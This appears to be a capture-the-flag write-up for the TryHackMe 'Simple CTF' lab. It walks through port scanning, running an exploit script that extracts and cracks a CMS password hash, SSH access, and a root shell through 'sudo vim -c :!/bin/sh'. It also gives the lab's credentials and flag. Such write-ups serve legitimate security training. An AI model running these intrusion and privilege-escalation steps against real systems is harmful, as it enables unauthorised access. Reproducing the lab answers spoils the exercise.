# Simple CTF

## Overview

* **Difficulty:** Easy
* **Category:** Web Exploitation / Password Cracking / Privilege Escalation
* **Skills Practiced:** Port scanning, FTP enumeration, web exploitation, hash cracking, privilege escalation

## Tools & Techniques

* `nmap` - for port and service scanning
* Python virtual environment - for isolated exploit environment
* Exploit script (`exploit.py`) - for web application exploitation
* `rockyou.txt` - for password cracking
* `ssh` - for remote access
* `sudo` and `vim` - for privilege escalation

## Walkthrough (Step-by-Step)

### 1. Deployment & Setup

* Connect to TryHackMe with OpenVPN or use the AttackBox
* Deploy the **Simple CTF** machine

### 2. Reconnaissance

**Nmap Scan:**

```bash
nmap -p- <target-ip>
```

**Findings:**
* Port 21 - FTP
* Port 80 - HTTP
* Port 2222 - SSH (non-standard port)

### 3. Web Application Exploitation

1. **Prepare Environment:**

	```bash
	python -m venv venv
	source venv/bin/activate
	pip install -r requirements.txt
	```

2. **Run Exploit:**

	```bash
	python3 exploit.py -u http://<target-ip>/simple -c -w /usr/share/wordlists/rockyou.txt
	```

	**Output:**
	```
	[+] Salt for password found: 1dac0d92e9fa6bb2
	[+] Username found: mitch
	[+] Email found: admin@admin.com
	[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
	[+] Password cracked: secret
	```

### 4. Initial Access

**SSH Connection:**

```bash
ssh mitch@<target-ip>
```
* Password: `secret`

### 5. Privilege Escalation

1. **Enumerate Sudo Rights:**

	```bash
	sudo -l
	```

**Finding:** User `mitch` can run `/usr/bin/vim` as root without password

2. **Exploit Vim for Root Shell:**

	```bash
	sudo vim -c ':!/bin/sh'
	```

3. **Get Root Flag:**

	```bash
	cd /root
	cat root.txt
	```

	**Flag:** `W3ll d0n3. You made it!`
